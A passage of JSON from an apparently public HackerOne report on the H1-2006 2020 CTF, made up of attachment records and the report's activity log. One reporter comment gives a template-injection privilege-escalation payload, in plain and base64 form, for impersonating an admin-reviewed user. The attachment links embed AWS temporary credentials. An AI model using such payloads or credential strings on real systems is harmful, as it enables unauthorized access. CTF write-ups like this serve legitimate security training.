2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=446ba15eff2c971e33e0b9e9c5b1c41a8b16c392b8701b83522f4043a7daf595","file_size":117137,"type":"image/png"},{"id":861468,"file_name":"Picture3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8QvPKWLVv95rgyv2vmpktif5?response-content-disposition=attachment%3B%20filename%3D%22Picture3.png%22%3B%20filename%2A%3DUTF-8%27%27Picture3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=4f8cd81fee95cfabdbdaacd0cb5365cd823f574a4aef6eadb7a26696c77aa3b5","file_size":128302,"type":"image/png"},{"id":861469,"file_name":"Picture4.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YbgPAtRNNti1dk41XdVnguHE?response-content-disposition=attachment%3B%20filename%3D%22Picture4.png%22%3B%20filename%2A%3DUTF-8%27%27Picture4.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=57dd8a4e2e68706b5206e289a50a3cc484f65663fa6892ea4977ed21289cae55","file_size":156770,"type":"image/png"},{"id":861470,"file_name":"Picture5.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MSb6H3DttrM1mMMQThR4HTkh?response-content-disposition=attachment%3B%20filename%3D%22Picture5.png%22%3B%20filename%2A%3DUTF-8%27%27Picture5.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=a8e810f267a695ef455d9b8d423c34efc37291c40b6aa7c07e414f36c507d845","file_size":70765,"type":"image/png"},{"id":861471,"file_name":"Picture6.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4q3kKh7ziB8Nonnxna5LQNyP?response-content-disposition=attachment%3B%20filename%3D%22Picture6.png%22%3B%20filename%2A%3DUTF-8%27%27Picture6.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=f623713467b556bf83037949db1ebf181d1980fbf584c95331c26e290f01ca2a","file_size":83111,"type":"image/png"},{"id":861472,"file_name":"Picture7.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UCF4PoEt7mbKRyyJ64z2Lg2o?response-content-disposition=attachment%3B%20filename%3D%22Picture7.png%22%3B%20filename%2A%3DUTF-8%27%27Picture7.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=a286df45e039e94f953eec0a28b58c3359a1a368511da71bda08180db18b454e","file_size":124670,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-18T12:41:35.654Z","allow_singular_disclosure_after":-14149580.560310101,"singular_disclosure_allowed":true,"vote_count":3,"voters":["nytr0gen","brahim_boufakri01","03_71"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8256158,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-10T16:14:51.940Z","updated_at":"2020-06-10T16:14:51.940Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8256172,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-10T16:16:08.128Z","updated_at":"2020-06-10T16:16:08.128Z","additional_data":{"old_title":"Exploiting multiple vulnerabilities to get hacker's payment ensured","new_title":"[H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268308,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:03:01.725Z","updated_at":"2020-06-11T23:03:01.725Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324971,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:28:20.036Z","updated_at":"2020-06-17T22:28:20.036Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hecsv17","url":"/hecsv17"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8331417,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks again for this CTF.","markdown_message":"\u003cp\u003eThanks again for this CTF.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-18T12:41:35.628Z","updated_at":"2020-06-18T12:41:35.628Z","first_to_agree":true,"actor":{"username":"hecsv17","cleared":false,"url":"/hecsv17","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iTZtwYanWLMA7Fw1o5fiKFav/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8331552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the privilege escalation part the correct payload is: `?template[]=login\u0026template[]=ticket\u0026username=sandra.allison\u0026ticket_id=3582#tab4` base64 encode it =\u003e `Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjQ=` and report it to admin.","markdown_message":"\u003cp\u003eFor the privilege escalation part the correct payload is: \u003ccode\u003e?template[]=login\u0026amp;template[]=ticket\u0026amp;username=sandra.allison\u0026amp;ticket_id=3582#tab4\u003c/code\u003e base64 encode it =\u0026gt; \u003ccode\u003eLz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjQ=\u003c/code\u003e and report it to admin.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-18T13:02:42.615Z","updated_at":"2020-06-18T13:02:42.615Z","actor":{"username":"hecsv17","cleared":false,"url":"/hecsv17","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iTZtwYanWLMA7Fw1o5fiKFav/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:25:13.115Z","updated_at":"2020-06-18T15:25:13.115Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332740,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:25:13.215Z","updated_at":"2020-06-18T15:25:13.215Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}